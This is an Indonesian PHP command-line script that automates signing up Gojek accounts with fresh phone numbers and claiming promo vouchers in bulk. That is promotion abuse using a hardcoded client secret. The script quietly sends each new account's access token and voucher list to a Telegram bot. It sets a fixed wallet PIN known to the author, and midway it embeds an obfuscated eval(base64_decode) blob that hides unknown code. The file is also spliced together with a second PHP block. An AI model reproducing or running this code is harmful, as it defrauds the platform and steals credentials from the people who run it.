de
<?php
date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("green","# # # # # # # # # # # # # # # # # # # # # # # \n");
echo color("blue","  [♥]  Time  : ".date('[d-m-Y] [H:i:s]')."   \n");
echo color("red","   [♡] TOLONG DIBACA DULU SEBELUM MENGGUNAKAN SC \n");
echo color("purple","[♥] NGETIK NOMORNYA BEGINI YA 62xxxxxxxxxx \n");
echo color("yellow","[♥] KADANG NGAMBIL OTOMATIS KADANG MANUAL \n");
echo color("blue"," [♡] MAKLUM LAH NAMANYA JUGA SC GRATISAN \n");
echo color("purple"," [♥] SCRIPT INI GRATIS, BILA ADA YG JUAL CHAT WA \n");
echo color("green","# # # # # # # # # # # # # # # # # # # # # # # \n");
	echo "\n";
echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
echo "\e[93mPUNYA AKUN BUAT LOGIN ?: ";	
       $pilihy = trim(fgets(STDIN));
if($pilihy == "y" || $pilihy == "punya")
echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
	goto login;
login:
echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
$pass =  ( '║ User Login : ' );
echo "\033[30;40m";
$user = trim(fgets(STDIN));
echo "\033[0m";
if($user == "y")
{
	echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
	echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
	echo "\e[93mKETIK NAMA ANDA YA?: ";
	$input = trim(fgets(STDIN));
	echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
		goto ulang;
}
else
{
		echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";	
		echo "\e[91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
		echo "\e[92m[🚫]        \e[91mMAMPOS GA PUNYA AKUNNYA 😆    \e[92m [🚫]\n";
	        echo "\e[92m[🚫]              \e[91m⚠️ WARNING ⚠️           \e[92m [🚫]\n";
		echo "\e[92m[🚫]           \e[91mSEGERA MINTA IZIN          \e[92m [🚫]\n";
	        echo "\e[92m[🚫]          \e[91mTELEGRAM :@SASUKE_UCI     \e[92m [🚫]\n";
		echo "\e[91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
goto login;
}
	return rtrim( $input, "\n" );
ulang:
echo "\n";
echo "\e[92m             (HALLO MAS $input )               \n";
echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
// function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        echo color("yellow","📲▶️ NOMOR YANG FRESH YA : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
        }
         elseif(substr(trim($nohp), 0, 2)=='62'){
            $hp = '6'.substr(trim($nohp), 1);
        }
        else{
            $hp = '1'.substr(trim($nohp),0,13);
        }
    }
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("yellow","📶▶️ KODE OTP UDAH GUA KIRIM ")."\n";
        otp:
        echo color("red","💬▶️ Otp : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("yellow","✔️▶️ BERHASIL MEMDAFTAR\n");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo color("white","+] Your access token : ".$token."\n\n");
        save("token.txt",$token);
        echo color("green","\n▬▬▬▬▬▬▬▬▬▬▬▬🎫AUTO CLAIM KAYANYA 🎫▬▬▬▬▬▬▬▬▬▬▬▬");
<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=bca34dbdfa67c25347a069168d34726e0c2c9e507VrtcuI4Fv2drup3ULuoBjpgY74CZDO7TEISOgRSQHo6m8m6FFuAJ8by2iKdnp5+jX2Kfap9kr2ygdggB7una2p+DEUgSPece6V7JNmSDcyIZpAJXlhMY+ac/EptonmE5bJtz8TKe/yAXYaz+cPXr0xbtxYGQdJkYevMpLbszBwJKhYWtqet168UBa2qkD6DMpLLf3n9iugzinRqUTcnucSQChIKv0bHw+7VGJ0N2+PuCI27J+0LdNJF76/bPfSzLXHPYYZPM5ORKMcY4kaohSTZgObksrdGcV68uUO35y2z5d1l8zK3Tsa1fvXJI3FR54lBs9m6NBXJKXXnmKELCp1WL797924FXxlkbDzH6Ajxr1ykgsyxaUGNx1zNJY6FdZKTkFRAEvz5sDyS0ZxpLraNnFoqFVCz2QxTCEPsDy4HQ7+rwqaQt4xNwRtzzXluMiXMy43GJ91+PhosnTlJjSJx18vgm3/4tTvNc2Cd1DafwraYwhZFbZ+tzQnKvXFcMtUgtfosl1Vu/7VfKjbvlGwh6JoAlM+jL8+oFdJb3IObXMiuUCpU8kdH2Xo5u4Xwo3vu863I+etr9CexPBLvSeWeSi854nHIAqwa9hv2yR2aE5E7BJosr5q24XDlTOgLxTnjvsREqpAIGlwRUIUYMzBh8AGY/SL5I05qSVk5GHxy9h9T/1uncxADDDkS1PLBJ2ehyJnBXAll+1A4c/wiz5zaxNAWjqbThc3cz1DdPZG+ZsN6A/GYHoPJ5Qi55N8L4rGcpDzWFH3hMTonrgdD3F5YViEIL9wC3tPMdaiXW7MUUFaizNEYfSC2lM2HuzoDFX45uIIBO4L+CRtDcwpZ+Ftz7Zw/LgYnHTQYX8myBJMqzGYhAPC2dsAHzNmce3iIOycV3g1qkCbdMonNtGU6pvQX8tDSqe21YB50qclXF24ttb7whvImwjzpO5ERz1Ck9cuqoIt4/dfCyoFHdJcwMGpUqmrNKNWLRK+SoqqSehFX1ftiXa+WSo0Gvq+pZCPBsHDAEIzLruLrRvGNPkdTrcbk2rflica6TjxPmGtRh//YGZ63R90euuz0T9qn4/ZwcwHaUkfEw1ogfgAR4GJhGmGcSzy6cHWi0U82cTVIRAuwBRFWFOn+HboBPArcoyAsvqIHEXKt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

        echo "\n".color("red","🔐▶️ INI VOC FOOD");
        echo "\n".color("yellow","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("green",".");
        sleep(10);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2206"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("blue","🔓▶️ Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
	gocar:
        echo "\n".color("yellow","🔐▶️ INI VOC MAKAN ");
        echo "\n".color("green","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(20);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2206"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("blue","🔓▶️ Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
        gofood:
        echo "\n".color("yellow","🔐▶️ INI VOC 15-10-5 ");
        echo "\n".color("green","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("blue",".");
        sleep(5);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2206"}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("red","🔓▶️ Message: ".$message);
        echo "\n".color("yellow","🔐▶️ INI VOC REFRESH FOOD");
        echo "\n".color("green","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("white",".");
        sleep(5);
        }
        sleep(3);
        $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2206"}');
        $messageboba09 = fetch_value($boba09,'"message":"','"');
        echo "\n".color("blue","🔓▶️ Message: ".$messageboba09);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
        echo "\n".color("red","🎫▶️ Total voucher ".$total." : ");
        echo "\n".color("purple","                     1. ".$voucher1);
        echo "\n".color("yellow","                     2. ".$voucher2);
        echo "\n".color("blue","                     3. ".$voucher3);
        echo "\n".color("nevy","                     4. ".$voucher4);
        echo "\n".color("green","                     5. ".$voucher5);
        echo "\n".color("purple","                     6. ".$voucher6);
        echo "\n".color("yellow","                     7. ".$voucher7);
        echo "\n".color("blue","                     8. ".$voucher8);
        echo "\n".color("nevy","                     9. ".$voucher9);
        echo "\n".color("green","                     10. ".$voucher10);
	echo "\n".color("purple","                     11. ".$voucher11);
        echo "\n".color("yellow","                     12. ".$voucher12);
        echo "\n".color("blue","                     13. ".$voucher13);
        echo"\n";
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
        $TOKEN  = ":";
	$chatid = "";
	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
	$method	= "sendMessage";
	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         setpin:
         echo "\n".color("purple","🔧▶️ SET PIN CUK BIAR AMAN !!!: y/n ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("red","▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔧 PIN MU = 010909 🔧▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
         $data2 = '{"pin":"010909"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "Otp pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] GAGAL!!!\n");
         }
         }
         }
         }else{
         echo color("red","-] OTPNYA YANG BENER BRAY");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("yellow","!] INPUT ULANG YANG BENER YE\n");
         goto otp;
         }
         }else{
         echo color("red","-] NOMOR LO GA FRESH YA");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("yellow","!] MASUKAN YG FRESH COY\n");
         goto ulang;
         }
//  }

// echo change()."\n";
